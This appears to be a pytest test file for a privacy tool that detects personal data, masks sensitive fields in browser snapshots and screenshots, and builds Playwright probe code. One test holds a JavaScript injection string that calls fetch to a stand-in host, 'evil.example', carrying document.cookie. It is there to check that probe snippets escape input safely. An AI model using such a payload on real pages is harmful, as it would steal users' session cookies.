"""Personal-data patterns, snapshot scanning for masks, the PNG coverage check and probe snippets."""

from __future__ import annotations

import json

import pytest

from secret_gate.browser_mask import MASK_RGB, Box, MaskConfig, decode_png, page_tree, parse_boxes, sensitive_refs, uncovered_boxes
from secret_gate.browser_probe import MaskPlan, check_target, field_state_code, form_target_code, masked_screenshot_code, result_json
from secret_gate.errors import PolicyViolation, ValidationError
from secret_gate.pii import BANK_CARD, EMAIL, ID_NUMBER, PHONE, check_kinds, find_pii
from tests.fixtures.png import make_png

TEXT = ("Contact alice.demo@example.com, 13800138000, +1 202-555-0147. ID 11010519491231002X, "
        "card 4111 1111 1111 1111, order 2026-09-24, invoice 12345678, bad id 110105194912310021, card 4111111111111112")


def test_find_pii_kinds_and_validation():
    found = {(m.kind, m.value) for m in find_pii(TEXT)}
    assert found == {(EMAIL, "alice.demo@example.com"), (PHONE, "13800138000"), (PHONE, "+1 202-555-0147"),
                     (ID_NUMBER, "11010519491231002X"), (BANK_CARD, "4111 1111 1111 1111")}
    assert find_pii(TEXT, [EMAIL]) == find_pii("alice.demo@example.com", [EMAIL])
    assert find_pii("") == () and find_pii("nothing here") == ()


def test_find_pii_dedups_and_prefers_the_id_over_a_card():
    text = "11010519491231002X and again 11010519491231002X"
    assert [m.kind for m in find_pii(text)] == [ID_NUMBER]


def test_unknown_kind_is_rejected():
    with pytest.raises(ValueError, match="unknown"):
        check_kinds(["email", "password"])


SNAPSHOT = """### Page
- Page URL: https://crm.example.com/c?mail=alice.demo@example.com
### Snapshot
```yaml
- generic [ref=e1]:
  - paragraph [ref=e2]:
    - text: "Contact: alice.demo@example.com"
  - textbox "Password" [ref=e3]: Hunter2-Fake-Pa55!
  - iframe [ref=e4]:
    - paragraph [ref=f1e2]: inner bob@example.org
```
"""


def test_sensitive_refs_maps_text_lines_to_their_element_and_skips_the_header():
    found = sensitive_refs(SNAPSHOT, ["Hunter2-Fake-Pa55!"], [EMAIL])
    assert found.refs == ("e2", "e3", "f1e2") and found.unmapped == 0
    assert sensitive_refs(SNAPSHOT, [], []).refs == ()
    assert page_tree(SNAPSHOT)[0] == "" and "Page URL" not in "\n".join(page_tree(SNAPSHOT))


def test_sensitive_line_without_any_element_is_reported():
    found = sensitive_refs("- text: alice.demo@example.com", [], [EMAIL])
    assert found.refs == () and found.unmapped == 1


def test_encoded_forms_of_values_are_found():
    found = sensitive_refs('- textbox [ref=e5]: a%2Fb%26c', ["a/b&c"], [])
    assert found.refs == ("e5",)


@pytest.mark.parametrize("alpha", [False, True])
def test_png_decoder_handles_every_filter(alpha):
    png = make_png(40, 30, [(5, 5, 10, 10, MASK_RGB)], alpha=alpha, filters=(0, 1, 2, 3, 4))
    width, height, bpp, pixels = decode_png(png)
    assert (width, height, bpp) == (40, 30, 4 if alpha else 3)
    stride = width * bpp
    assert tuple(pixels[7 * stride + 7 * bpp:7 * stride + 7 * bpp + 3]) == MASK_RGB
    assert tuple(pixels[0:3]) == (255, 255, 255)


def test_coverage_check():
    png = make_png(100, 60, [(10, 10, 30, 20, MASK_RGB)], filters=(4,))
    assert uncovered_boxes(png, [Box(10, 10, 30, 20)]) == ()
    assert uncovered_boxes(png, [Box(50, 10, 30, 20)]) == (Box(50, 10, 30, 20),)
    assert uncovered_boxes(png, [Box(10.4, 10.6, 29.2, 19.1)]) == ()  # fractional edges: 1px inset
    assert uncovered_boxes(png, [Box(-50, -50, 10, 10)]) == ()  # entirely outside the image: nothing to show
    assert uncovered_boxes(png, [Box(95, 55, 40, 40)]) == (Box(95, 55, 40, 40),)  # the visible corner must be covered
    corner = make_png(100, 60, [(90, 50, 10, 10, MASK_RGB)])
    assert uncovered_boxes(corner, [Box(90, 50, 40, 40)]) == ()  # clipped to the image
    assert uncovered_boxes(png, []) == ()


@pytest.mark.parametrize("data", [b"not a png", make_png(4, 4)[:40]])
def test_bad_png_is_rejected(data):
    with pytest.raises(ValueError):
        uncovered_boxes(data, [Box(0, 0, 4, 4)])


def test_unsupported_png_formats_are_rejected():
    import struct
    import zlib

    def chunk(kind, body):
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body))

    grey = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 2, 2, 8, 0, 0, 0, 0)) + chunk(b"IEND", b"")
    with pytest.raises(ValueError, match="unsupported"):
        decode_png(grey)
    with pytest.raises(ValueError, match="without header"):
        decode_png(b"\x89PNG\r\n\x1a\n" + chunk(b"IEND", b""))
    bad_filter = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)) + \
        chunk(b"IDAT", zlib.compress(b"\x09\x00\x00\x00")) + chunk(b"IEND", b"")
    with pytest.raises(ValueError, match="filter"):
        decode_png(bad_filter)


def test_parse_boxes():
    assert parse_boxes([{"x": 1, "y": 2.5, "width": 3, "height": 4}]) == (Box(1, 2.5, 3, 4),)
    for bad in (None, [1], [{"x": 1}], [{"x": True, "y": 1, "width": 1, "height": 1}]):
        with pytest.raises(ValueError):
            parse_boxes(bad)


def test_mask_config_file(tmp_path):
    assert MaskConfig.load(tmp_path) == MaskConfig()
    (tmp_path / "screenshot-mask.json").write_text(json.dumps({"kinds": ["email"], "regions": {"crm.example.com:8443": [".card"]}}))
    config = MaskConfig.load(tmp_path)
    assert config.kinds == ("email",) and config.selectors_for("crm.example.com:8443") == (".card",)
    assert config.selectors_for("crm.example.com:443") == ()
    for bad in ({"kinds": ["x"]}, {"regions": []}, {"regions": {"a.com": [1]}}, {"other": 1}, []):
        (tmp_path / "screenshot-mask.json").write_text(json.dumps(bad))
        with pytest.raises(ValidationError, match="invalid"):
            MaskConfig.load(tmp_path)


def test_probe_snippets_embed_only_json_literals():
    hostile = '"); fetch("https://evil.example/"+document.cookie); ("'
    code = field_state_code(hostile)
    assert json.dumps(hostile) in code and "inputValue" in code
    assert json.dumps("e12") in form_target_code("e12")
    plan = MaskPlan(refs=("e1", "f2e3", "not a ref"), selectors=("input[type=password]",), path="/tmp/x.png", full_page=True)
    shot = masked_screenshot_code(plan)
    spec = json.loads(shot.split("const spec = ", 1)[1].split("; const masks", 1)[0])
    assert spec["refs"] == ["e1", "f2e3"] and spec["fullPage"] is True and spec["color"] == "#FF00FF"
    for bad in ("", "  ", None, "x" * 501):
        with pytest.raises(PolicyViolation):
            check_target(bad)


def test_result_json():
    assert result_json('### Result\n{"a": 1}\n### Ran Playwright code\n...') == {"a": 1}
    for bad in ("no result", "### Result\nnot json"):
        with pytest.raises(PolicyViolation):
            result_json(bad)


def test_css_masks_also_apply_inside_frames():
    code = masked_screenshot_code(MaskPlan(refs=(), selectors=("input[type=password]",), path="/tmp/x.png"))
    assert "page.frames().slice(1)" in code and "frame.locator(css)" in code
